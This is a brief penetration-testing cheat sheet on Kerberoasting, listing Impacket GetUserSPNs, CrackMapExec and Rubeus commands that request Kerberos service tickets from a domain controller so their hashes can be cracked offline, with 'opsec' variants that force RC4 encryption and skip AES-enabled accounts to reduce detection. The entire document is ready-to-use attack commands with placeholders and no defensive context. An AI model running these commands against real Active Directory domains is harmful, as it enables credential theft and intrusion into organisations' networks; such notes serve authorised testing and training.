# Kerberoasting
TGS-REP
```bash
impacket-GetUserSPNs -dc-ip <IP> '<DOMAIN>/' -usersfile <USERLIST>
impacket-GetUserSPNs -dc-ip <IP> '<DOMAIN>/<USER>:<PASS>' -request # PTH

crackmapexec ldap <IP> --kdcHost <IP> -u '<USER>' -p '<PASS>' --kerberoasting <OUTPUT> # PTH

Rubeus.exe kerberoast /nowrap
Rubeus.exe kerberoast /usetgtdeleg /nowrap # tgtdeleg ticket to request service tickets - requests RC4 for AES accounts
Rubeus.exe kerberoast /rc4opsec /nowrap # "opsec" Kerberoasting, using tgtdeleg, and filtering out AES-enabled accounts
```